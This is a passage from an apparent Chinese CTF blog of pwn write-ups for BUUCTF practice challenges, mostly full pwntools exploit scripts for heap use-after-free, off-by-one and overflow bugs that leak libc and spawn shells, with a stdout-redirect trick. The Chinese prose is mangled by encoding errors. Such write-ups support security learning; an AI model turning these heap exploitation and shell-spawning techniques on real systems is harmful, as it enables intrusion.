:u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(type,number)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'&gt;'</span>,str(type))    sla(<span class="hljs-string">":"</span>,str(number))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(type)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'&gt;'</span>,str(type))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(type)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'&gt;'</span>,str(type))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leave</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'4'</span>)    <span class="hljs-comment"># sa('?',str(mes))</span>add(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)free(<span class="hljs-number">1</span>) <span class="hljs-comment">#leave chunk 0 </span>add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>) <span class="hljs-comment"># 0x90</span><span class="hljs-comment">#ready to dup</span>add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)free(<span class="hljs-number">2</span>)add(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-comment"># get chunk0</span>free(<span class="hljs-number">2</span>)<span class="hljs-comment">#leak heap</span>show(<span class="hljs-number">2</span>)ru(<span class="hljs-string">'number :'</span>)chunk0_addr_word = int(ru(<span class="hljs-string">'\n'</span>)) - <span class="hljs-number">0xa0</span>info_addr(<span class="hljs-string">'chunk0_addr'</span>,chunk0_addr_word)add(<span class="hljs-number">2</span>,chunk0_addr_word)add(<span class="hljs-number">2</span>,chunk0_addr_word)add(<span class="hljs-number">2</span>,<span class="hljs-number">0x91</span>) <span class="hljs-comment">#fake unsortbin chunk</span><span class="hljs-comment">#full tache bins</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):    free(<span class="hljs-number">1</span>)    add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)<span class="hljs-comment">#leak libc</span>free(<span class="hljs-number">1</span>)show(<span class="hljs-number">1</span>)ru(<span class="hljs-string">'number :'</span>)stdin_fillno = int(ru(<span class="hljs-string">'\n'</span>)) - <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0x70</span>info_addr(<span class="hljs-string">'stdin_fillno'</span>,stdin_fillno)<span class="hljs-comment">#ready to attack stdin_fillno ,use taeche dup</span>add(<span class="hljs-number">1</span>,stdin_fillno)add(<span class="hljs-number">1</span>,stdin_fillno)free(<span class="hljs-number">1</span>)add(<span class="hljs-number">2</span>,stdin_fillno)free(<span class="hljs-number">1</span>)<span class="hljs-comment">#leak contains libc's heap</span>show(<span class="hljs-number">1</span>)ru(<span class="hljs-string">'number :'</span>)chunk1_addr_dword = int(ru(<span class="hljs-string">'\n'</span>)) - <span class="hljs-number">0x30</span>info_addr(<span class="hljs-string">'chunk1_addr_dword'</span>,chunk1_addr_dword)<span class="hljs-comment">#change the 0x30bins chains</span>add(<span class="hljs-number">1</span>,chunk1_addr_dword)add(<span class="hljs-number">1</span>,chunk1_addr_dword)add(<span class="hljs-number">1</span>,stdin_fillno)<span class="hljs-comment">#attck the fileno</span>add(<span class="hljs-number">1</span>,<span class="hljs-number">666</span>)leave()itr()</code></pre></div><p>æ¸£æ¸£è‹±æ–‡æ³¨é‡Šï¼Œå…ˆä¸æ”¹äº†ã€‚æ„Ÿè§‰è¿˜æ˜¯æŒºä¸å®¹æ˜“åšçš„é¢˜ï¼Œå †å—å¦‚ä½•æ„é€ æƒ³äº†è€ä¹…ã€‚åˆ°åˆ«çš„å¸ˆå‚…é‚£é‡Œï¼Œå½’ç±»ä¸ºç®€å•é¢˜ã€‚å¤ªèœäº†å¤ªèœäº†ï¼ŒåŸºç¡€è¿˜ä¸æ˜¯å¾ˆå¥½ã€‚</p><h2 id="pwnable-hacknote"><a href="#pwnable-hacknote" class="headerlink" title="pwnable_hacknote"></a><code>pwnable_hacknote</code></h2><h3 id="åˆ†æ-12"><a href="#åˆ†æ-12" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ç®€å•çš„uaf</p><h4 id="å‘ç‚¹"><a href="#å‘ç‚¹" class="headerlink" title="å‘ç‚¹"></a>å‘ç‚¹</h4><div class="hljs"><pre><code class="hljs c">(*(<span class="hljs-keyword">void</span> (__cdecl **)(<span class="hljs-keyword">void</span> *))ptr[v1])(ptr[v1]);</code></pre></div><p>æ­¤å¤„åœ¨æ”¹å®Œ<code>ptr[v1]</code>ä¸ºsystemä»¥åï¼Œå…¶å‚æ•°çš„æŒ‡é’ˆæ˜¯ä»è¿™ä¸ªå †å—å¼€å§‹çš„è¦æå‰è¿›è¡Œæˆªæ–­ã€‚</p><div class="hljs"><pre><code class="hljs c">system(p32(system) + '||sh')system(p32(system) + ';sh;')</code></pre></div><h3 id="exp-15"><a href="#exp-15" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./hacknote'</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27225</span>)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,data)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size'</span>,str(size))    sa(<span class="hljs-string">'Content'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))add(<span class="hljs-number">0x20</span>,<span class="hljs-string">'bbbb'</span>)add(<span class="hljs-number">0x20</span>,<span class="hljs-string">'bbbb'</span>)free(<span class="hljs-number">0</span>)free(<span class="hljs-number">1</span>)add(<span class="hljs-number">8</span>,p32(<span class="hljs-number">0x0804862B</span>) + p32(elf.got[<span class="hljs-string">'__libc_start_main'</span>]))show(<span class="hljs-number">0</span>)r()libc_base = uu32(r(<span class="hljs-number">4</span>)) - <span class="hljs-number">0x18540</span>info_addr(<span class="hljs-string">'base'</span>,libc_base)free(<span class="hljs-number">2</span>)system = <span class="hljs-number">0x0003ada0</span> + libc_baseadd(<span class="hljs-number">8</span>,p32(system) + <span class="hljs-string">'||sh'</span>)show(<span class="hljs-number">0</span>)itr()</code></pre></div><p>Buuè¿œç¨‹æ‰“ä¸é€šã€‚ã€‚</p><h2 id="hitcontraining-heapcreator"><a href="#hitcontraining-heapcreator" class="headerlink" title="hitcontraining_heapcreator"></a><code>hitcontraining_heapcreator</code></h2><h3 id="åˆ†æ-13"><a href="#åˆ†æ-13" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>Editå‡½æ•°å¤„ï¼Œæ•…æ„å¯ä»¥å¤šå†™å‡ºä¸€ä¸ªå­—èŠ‚ã€‚</p><ul><li>off by one</li></ul><h3 id="exp-16"><a href="#exp-16" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./heapcreator'</span>context.log_level = <span class="hljs-string">'debug'</span>elf = ELF(local_file)debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26646</span>)    libc = elf.libc    <span class="hljs-comment"># remote_libc = '.' # './libc.so.6'</span>    <span class="hljs-comment"># libc = ELF(remote_libc)</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,data)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'Heap'</span>,str(size))    sa(<span class="hljs-string">'heap'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sa(<span class="hljs-string">'heap'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))add(<span class="hljs-number">0x18</span>,<span class="hljs-string">'\x00'</span>)add(<span class="hljs-number">0x20</span>,<span class="hljs-string">'bbbb'</span>)add(<span class="hljs-number">0x20</span>,<span class="hljs-string">'cccc'</span>)add(<span class="hljs-number">0x10</span>,<span class="hljs-string">'dddd'</span>)payload = <span class="hljs-number">0x18</span> * <span class="hljs-string">'a'</span> + <span class="hljs-string">'\xa1'</span>edit(<span class="hljs-number">0</span>,payload)free(<span class="hljs-number">1</span>)add(<span class="hljs-number">0x10</span>,<span class="hljs-string">'\x78'</span>)show(<span class="hljs-number">1</span>)ru(<span class="hljs-string">'Content : '</span>)base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3c4b78</span>info_addr(<span class="hljs-string">'libc_base'</span>,base)free(<span class="hljs-number">1</span>)free_hook = <span class="hljs-number">0x3c67a8</span> + basepaylaod = <span class="hljs-string">'\x00'</span> * <span class="hljs-number">2</span> * <span class="hljs-number">8</span>  + p64(<span class="hljs-number">8</span>) + p64(free_hook)add(<span class="hljs-number">0x30</span>,paylaod)rce = base + rce16[<span class="hljs-number">1</span>]edit(<span class="hljs-number">2</span>,p64(rce))free(<span class="hljs-number">0</span>)itr()</code></pre></div><h2 id="0ctf-2017-babyheap"><a href="#0ctf-2017-babyheap" class="headerlink" title="0ctf_2017_babyheap"></a><code>0ctf_2017_babyheap</code></h2><h3 id="åˆ†æ-14"><a href="#åˆ†æ-14" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ä¿æŠ¤å…¨å¼€ï¼Œç¨‹åºé€†å‘èµ·æ¥çœ‹èµ·æ¥å¾ˆä¹±ï¼Œå¹¶ä¸”å †å—å®šä½æ˜¯é€šè¿‡æ ˆæ¥ä¼ å‚ï¼Œæ²¡æœ‰å…¨å±€æŒ‡é’ˆã€‚</p><h4 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h4><p>calloc å‡½æ•°åŸºæœ¬è·Ÿmallocä¸€æ ·ï¼Œä½†æ˜¯å†åˆ†é…å¥½å †å—æ—¶ï¼Œä¼šæŠŠåˆ†é…åˆ°çš„å †å—å…¨éƒ¨æ¸…ç†ä¸º0ã€‚</p><h5 id="å½±å“"><a href="#å½±å“" class="headerlink" title="å½±å“"></a>å½±å“</h5><p>æ— æ³•é€šè¿‡ä¼ ç»Ÿçš„unsortbinæ¥leak libcï¼Œç»“åˆfillå‡½æ•°ä¸­çš„å †æº¢å‡ºå³å¯ã€‚</p><h4 id="æ¼æ´ç‚¹-1"><a href="#æ¼æ´ç‚¹-1" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h4><p>Fill å‡½æ•°ä¸­ï¼Œæ˜æ˜¾æœ‰å †æº¢å‡ºï¼Œä¸”ååˆ†å¥½ç”¨ï¼Œæ•ˆæœå¾ˆå¤§ã€‚</p><h3 id="exp-17"><a href="#exp-17" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./0ctf_2017_babyheap'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26374</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size)</span>:</span>    sla(<span class="hljs-string">'Command'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'Size'</span>,str(size))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fill</span><span class="hljs-params">(idx,size,data)</span>:</span>    sla(<span class="hljs-string">'mand'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sla(<span class="hljs-string">'ize'</span>,str(size))    sa(<span class="hljs-string">'tent'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'mand'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dump</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'mand'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))add(<span class="hljs-number">0x30</span>) <span class="hljs-comment">#0</span>add(<span class="hljs-number">0x30</span>) <span class="hljs-comment">#1</span>add(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#2</span>add(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#3</span>add(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#4</span>add(<span class="hljs-number">0x20</span>) <span class="hljs-comment">#5</span>payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x30</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xa1</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span>fill(<span class="hljs-number">0</span>,<span class="hljs-number">0x60</span>,payload)free(<span class="hljs-number">1</span>)add(<span class="hljs-number">0x30</span>)dump(<span class="hljs-number">2</span>)ru(<span class="hljs-string">'Content: \n'</span>)base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3c4b78</span>info_addr(<span class="hljs-string">'libc_base'</span>,base)add(<span class="hljs-number">0x50</span>) <span class="hljs-comment">#6</span>add(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#7</span>add(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#8</span>free(<span class="hljs-number">7</span>)free(<span class="hljs-number">8</span>)malloc_hook = base + <span class="hljs-number">0x3c4b10</span>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">5</span> + p64(<span class="hljs-number">0x71</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">13</span> + p64(<span class="hljs-number">0x71</span>) + p64(malloc_hook<span class="hljs-number">-0x23</span>) fill(<span class="hljs-number">5</span>,len(payload),payload)add(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#7</span>add(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#8</span>rec = rce16[<span class="hljs-number">1</span>] + basepayload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x13</span> + p64(rec)fill(<span class="hljs-number">8</span>,len(payload),payload)add(<span class="hljs-number">0x20</span>)itr()</code></pre></div><h2 id="wustctf2020-closed"><a href="#wustctf2020-closed" class="headerlink" title="wustctf2020_closed"></a><code>wustctf2020_closed</code></h2><div class="hljs"><pre><code class="hljs c">close(<span class="hljs-number">1</span>);close(<span class="hljs-number">2</span>);<span class="hljs-keyword">return</span> shell();</code></pre></div><p>ç›´æ¥å°±ç»™ä½ shelläº†ï¼Œä½†æ˜¯stdoutå·²ç»è¢«å…³é—­äº†ã€‚ä½†æ˜¯å¯¹å…¶æ–‡ä»¶æè¿°ç¬¦<code>1</code>è¿›è¡Œé‡å®šå‘ä¸ºæ²¡æœ‰å…³é—­çš„<code>0</code>å³å¯ã€‚</p><div class="hljs"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span> 1&gt;&amp;0 &amp;&amp; cat flag</code></pre></div><h2 id="wustctf2020-getshell-2"><a href="#wustctf2020-getshell-2" class="headerlink" title="wustctf2020_getshell_2"></a><code>wustctf2020_getshell_2</code></h2><h3 id="åˆ†æ-15"><a href="#åˆ†æ-15" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">ssize_t</span> vulnerable()&#123;  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [esp+0h] [ebp-18h]</span>  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x24</span>u);&#125;</code></pre></div><p>æ˜æ˜¾å¯ä»¥çœ‹å‡ºåªå¯ä»¥æ§åˆ¶2ä¸ªgadgetã€‚ä¼˜å…ˆæƒ³åˆ°äº†æ ˆè¿ç§»ã€‚å¯æ˜¯ä¹Ÿæ²¡æœ‰åˆé€‚åœ°æ–¹å»è¿ç§»åˆ©ç”¨ã€‚</p><p>å€˜è‹¥å¯ä»¥æ§åˆ¶3ä¸ªgadgetï¼Œç›´æ¥ï¼š</p><div class="hljs"><pre><code class="hljs c">p32(system.plt) + p32(<span class="hljs-number">0xdeadbeef</span>) + p32(sh)</code></pre></div><p>è¿™æ ·å°±å¯ä»¥æ‹¿åˆ°shelläº†ã€‚</p><p>å› ä¸ºå¹³æ—¶ropæ—¶ï¼Œ32ä½ä¸‹è‡ªå·±<strong>ååˆ†</strong>ç»å¸¸**ç”¨<code>å‡½æ•°çš„plt+è¿”å›åœ°å€+å‚æ•°1</code>ï¼Œé€ æˆæ€è·¯å¡é¡¿ã€‚</p><h4 id="çªç ´"><a href="#çªç ´" class="headerlink" title="çªç ´"></a>çªç ´</h4><p>ä½†æ˜¯å°è¯•å»çœ‹ä¸‹åé—¨å‡½æ•°ï¼š</p><div class="hljs"><pre><code class="hljs c">.text:<span class="hljs-number">08048521</span> ; <span class="hljs-number">2</span>:   <span class="hljs-keyword">return</span> system(<span class="hljs-string">"/bbbbbbbbin_what_the_f?ck__--??/sh"</span>);.text:<span class="hljs-number">08048521</span>                 sub     esp, <span class="hljs-number">0</span>Ch.text:<span class="hljs-number">08048524</span>                 push    offset command  ; <span class="hljs-string">"/bbbbbbbbin_what_the_f?ck__--??/sh"</span>.text:<span class="hljs-number">08048529</span>                 call    _system.text:<span class="hljs-number">0804852</span>E                 add     esp, <span class="hljs-number">10</span>h.text:<span class="hljs-number">08048531</span>                 nop.text:<span class="hljs-number">08048532</span>                 leave.text:<span class="hljs-number">08048533</span>                 retn</code></pre></div><p>åœ¨08048524å¤„ï¼Œå¯ä»¥çœ‹åˆ°èµ·å…¶call systemå‰ï¼Œ<code>push    offset command</code>ï¼ŒæŠŠè¿™ä¸ªå­—ç¬¦ä¸²å‹æ ˆï¼Œæ¥ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ã€‚</p><p> é‚£å°±åœ¨æº¢å‡ºæ—¶ï¼Œè¿”å›åœ°å€å¡«ä¸Š<code>08048529</code> ï¼Œåœ¨è‡ªå·±å¡«ä¸Šshçš„åœ°å€å³å¯äº†ã€‚</p><p>è¿™æ ·å°±åœ¨call systemæ—¶ï¼Œå®Œæˆçš„æ˜¯<code>system(sh)</code>ã€‚</p><p>å…¶å®ä¹Ÿæ˜¯å¾ˆç®€å•çš„ï¼š</p><p>ç”±äº<code>å› ä¸ºå¹³æ—¶ropæ—¶ï¼Œ32ä½ä¸‹è‡ªå·±ç»å¸¸ç”¨`å‡½æ•°çš„plt+è¿”å›åœ°å€+å‚æ•°1`ï¼Œé€ æˆæ€è·¯å¡é¡¿ã€‚</code> ï¼Œå…¶å®è‡ªå·±åˆ†æä»¥åå°±æ˜¯ï¼š<code>å‡½æ•°çš„plt+4å­—èŠ‚+å‚æ•°1</code>ã€‚</p><p>æº¢å‡ºæ—¶ï¼Œå¡«ä¸Š<code>p32(0x8048529) + p32(sh)</code><br>æ ˆä¿¡æ¯ï¼š</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-selector-tag">0000</span>| <span class="hljs-selector-tag">0xffcca2fc</span> <span class="hljs-selector-tag">--</span>&gt; <span class="hljs-selector-tag">0x8048529</span> (&lt;shell+<span class="hljs-number">14</span>&gt;:     call   <span class="hljs-number">0</span>x80483e0 &lt;system<span class="hljs-variable">@plt</span>&gt;)<span class="hljs-selector-tag">0004</span>| <span class="hljs-selector-tag">0xffcca300</span> <span class="hljs-selector-tag">--</span>&gt; <span class="hljs-selector-tag">0x8048670</span> <span class="hljs-selector-tag">--</span>&gt; <span class="hljs-selector-tag">0x6873</span> (<span class="hljs-string">'sh'</span>)</code></pre></div><p>åœ¨æº¢å‡ºè°ƒç”¨æ—¶,retåˆ°ï¼š</p><div class="hljs"><pre><code class="hljs undefined">.<span class="hljs-built_in">text</span>:<span class="hljs-number">08048529</span>                 <span class="hljs-built_in">call</span>    <span class="hljs-variable">_system</span></code></pre></div><p>å…¶å°±æ˜¯</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">push</span> <span class="hljs-built_in">eip</span>+<span class="hljs-number">4</span><span class="hljs-keyword">jmp</span> system.plt</code></pre></div><p>ç„¶åæ ˆå°±å˜æˆäº†ï¼š</p><div class="hljs"><pre><code class="hljs undefined">=&gt; <span class="hljs-number">0x80483e0</span> &lt;<span class="hljs-symbol">system@</span>plt&gt;:      jmp    DWORD PTR ds:<span class="hljs-number">0x804a018</span> | <span class="hljs-number">0x80483e6</span> &lt;<span class="hljs-symbol">system@</span>plt+<span class="hljs-number">6</span>&gt;:    push   <span class="hljs-number">0x18</span> | <span class="hljs-number">0x80483eb</span> &lt;<span class="hljs-symbol">system@</span>plt+<span class="hljs-number">11</span>&gt;:   jmp    <span class="hljs-number">0x80483a0</span> | <span class="hljs-number">0x80483f0</span> &lt;<span class="hljs-symbol">__libc_start_main@</span>plt&gt;:   jmp    DWORD PTR ds:<span class="hljs-number">0x804a01c</span> | <span class="hljs-number">0x80483f6</span> &lt;<span class="hljs-symbol">__libc_start_main@</span>plt+<span class="hljs-number">6</span>&gt;: push   <span class="hljs-number">0x20</span> |-&gt;   <span class="hljs-number">0x80483e6</span> &lt;<span class="hljs-symbol">system@</span>plt+<span class="hljs-number">6</span>&gt;:        push   <span class="hljs-number">0x18</span>       <span class="hljs-number">0x80483eb</span> &lt;<span class="hljs-symbol">system@</span>plt+<span class="hljs-number">11</span>&gt;:       jmp    <span class="hljs-number">0x80483a0</span>       <span class="hljs-number">0x80483f0</span> &lt;<span class="hljs-symbol">__libc_start_main@</span>plt&gt;:       jmp    DWORD PTR ds:<span class="hljs-number">0x804a01c</span>       <span class="hljs-number">0x80483f6</span> &lt;<span class="hljs-symbol">__libc_start_main@</span>plt+<span class="hljs-number">6</span>&gt;:     push   <span class="hljs-number">0x20</span>                                                                  JUMP <span class="hljs-keyword">is</span> taken[------------------------------------stack-------------------------------------]<span class="hljs-number">0000</span>| <span class="hljs-number">0xffcca2fc</span> --&gt; <span class="hljs-number">0x804852e</span> (&lt;shell+<span class="hljs-number">19</span>&gt;:     add    esp,<span class="hljs-number">0x10</span>)<span class="hljs-number">0004</span>| <span 